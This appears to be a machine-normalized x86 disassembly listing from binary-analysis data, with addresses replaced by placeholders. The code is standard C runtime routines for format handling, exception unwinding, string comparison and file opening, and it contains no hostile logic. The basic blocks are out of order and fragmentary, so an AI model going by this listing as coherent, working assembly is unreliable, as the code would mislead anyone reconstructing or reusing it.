lea ebx [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x21c ] ebx
mov [ ebp - 0x264 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x224 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x224 ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x26c ] 0x1
mov [ ebp - 0x211 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x21c ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp - 0x21c ]
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
push [ ebp - 0x254 ]
call sub_10011c31
and [ ebp - 0x254 ] 0x0
pop ecx
mov ebx [ ebp - 0x234 ]
sub ebx [ ebp - 0x220 ]
sub ebx [ ebp - 0x230 ]
test [ ebp - 0x210 ] 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x230 ]
mov edi [ ebp - 0x260 ]
lea eax [ ebp - 0x228 ]
lea ecx [ ebp - 0x22c ]
call sub_10020722
test [ ebp - 0x210 ] 0x8
pop ecx
je r-xdata
push [ ebp - 0x260 ]
lea eax [ ebp - 0x228 ]
push ebx
push 0x20
call sub_100206fc
add esp 0xc
test al 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov [ ebp - 0x278 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x274 ] eax
lea eax [ ebp - 0x250 ]
push eax
push [ ebp - 0x26c ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x224 ] edi
push eax
push [ ebp - 0x264 ]
lea eax [ ebp - 0x278 ]
push ebx
push eax
push [ rw-data ]
call sub_100179d0
pop ecx
call eax
mov edi [ ebp - 0x210 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x224 ] edi
call sub_1002052a
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x220 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x21c ] ecx
je r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x224 ] edi
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x238 ] 0x0
mov eax [ ebp - 0x220 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
test al 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x230 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] esi
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x238 ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x220 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call sub_100206ac
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x240 ] 0x0
inc eax
inc eax
inc eax
mov ecx [ ebp - 0x21c ]
push eax
lea eax [ ebp - 0x228 ]
call sub_10020722
pop ecx
test eax eax
jle r-xdata
push edi
push ebx
push 0x30
lea eax [ ebp - 0x228 ]
call sub_100206fc
add esp 0xc
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_100166a9
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x254 ] eax
push 0x8
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x250 ]
push eax
push ebx
push [ rw-data ]
call sub_100179d0
pop ecx
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x228 ]
mov [ esi ] eax
mov ax [ ebp - 0x228 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x230 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x21c ] eax
jmp r-xdata
mov [ ebp - 0x258 ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x21c ]
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x21c ] eax
mov [ ebp - 0x264 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc ebx
mov [ ebp - 0x21c ] ebx
lea eax [ ebp - 0x250 ]
push eax
push ebx
push [ rw-data ]
call sub_100179d0
pop ecx
call eax
pop ecx
pop ecx
mov [ ebp - 0x258 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x220 ]
cdq
push edx
push eax
push ebx
push edi
call sub_1001f1f0
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x264 ] ebx
mov edi eax
mov ebx edx
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
push edi
push ebx
push 0x20
lea eax [ ebp - 0x228 ]
call sub_100206fc
add esp 0xc
or [ ebp - 0x228 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x270 ] eax
je r-xdata
pop esi
call sub_10010990
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x25c ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x21c ] esi
je r-xdata
cmp [ ebp - 0x228 ] 0x0
jl r-xdata
push [ ebp - 0x270 ]
lea eax [ ebp - 0x228 ]
lea ecx [ ebp - 0xc ]
call sub_10020722
cmp [ ebp - 0x264 ] 0x0
pop ecx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x264 ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x270 ]
inc esi
push eax
inc esi
call sub_100206ac
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x21c ]
mov ecx [ ebp - 0x21c ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_10021340
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10021360
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_10010789
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_100213a5
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_100213a5
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_10021360
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10021455
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10021474
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_1002144c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10021455
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10021480
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_100214b9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_100167f3
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_100167f3
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
push edi
push [ ebp + 0x8 ]
call sub_10021480
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub esi eax
mov eax esi
pop esi
cmp esi eax
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_10022735
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_10022735
add esp 0x10
inc edi
cmp esi ebx
je r-xdata
sub_1002158e
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100214b9
add esp 0xc
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_100167f3
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
pop esi
pop ebp
jmp sub_10021480
pop esi
pop ebp
retn
sub_100215f6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_100167f3
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_100167f3
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_10022735
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_10022735
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_10022880
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_100216e8
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100215f6
add esp 0x10
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_100167f3
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_10022880
sub_10021746
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
push edi
mov esi eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x34 ] 0xc
mov [ ebp - 0x30 ] ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x8000
test eax ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010a44
add esp 0x14
lea eax [ ebp - 0x20 ]
push eax
call sub_100226fc
pop ecx
test eax eax
je r-xdata
mov eax ecx
and eax 0x3
sub eax ebx
mov edx 0xc0000000
mov edi 0x80000000
je r-xdata
test ecx 0x74000
jne r-xdata
mov [ ebp - 0x8 ] edi
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
sub eax ecx
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
test ecx 0x70000
jne r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
call sub_10016806
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_100167f3
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10010b6c
add esp 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
mov edi 0x100
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax esi
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x1000
je r-xdata
or [ ebp - 0xc ] 0x4000000
or [ ebp - 0x8 ] 0x10000
or [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0x8 ] edi
sete al
mov [ ebp - 0x10 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0xc ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0xc ] 0x8000000
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
call sub_10020390
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0xc ] __dos_header
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileW@IAT ]
push ebx
push [ ebp - 0xc ]
mov [ eax ] 0x1
push [ ebp - 0x14 ]
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_10016806
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_100167f3
mov [ eax ] 0x18
jmp r-xdata
push [ ebp - 0x1c ]
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
call sub_100167f3
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_10016819
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp esi ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_10016819
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_100167f3
mov [ eax ] 0xd
jmp r-xdata
and [ ebp - 0x8 ] 0x7fffffff
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x34 ]
push [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ esi ]
call sub_1002014b
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
mov [ eax ] cl
cmp [ ebp - 0x3 ] bl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0xc0000000
mov ecx edi
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x20 ]
and eax edi
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_10019a8d
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp eax edi
jne r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x24 ]
push eax
push [ esi ]
mov [ ebp - 0x24 ] ebx
call sub_1001c2a7
add esp 0xc
test eax eax
jne r-xdata
call sub_10016806
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x34 ]
push 0x3
push eax
push [ ebp - 0x10 ]
and edi 0x7fffffff
push edi
push [ ebp + 0xc ]
call [ CreateFileW@IAT ]
cmp eax 0xffffffff
jne r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x18 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_10019a8d
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x24 ] 0x1a
jne r-xdata
push [ esi ]
call sub_1001a4bd
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_10016819
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_100201cc
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
push [ esi ]
call sub_1002248a
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x18 ]
push eax
push [ esi ]
call sub_1001c2a7
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x18 ] 0xbfbbef
mov [ ebp - 0x14 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_1001fd25
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x14 ] edi
jg r-xdata
mov [ ebp - 0x18 ] 0xfeff
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_1001fd25
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_1001a4bd
pop ecx
call sub_100167f3
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_10019a8d
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x18 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x18 ]
push eax
push [ esi ]
call sub_1001983d
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_10019a8d
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_1001fd25
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_1001fd25
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_10021e66
push 0x14
push r--data
call sub_10018984
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_100167f3
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_10010b6c
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_100189c9
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_10021746
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10021f04
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_10021f04
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
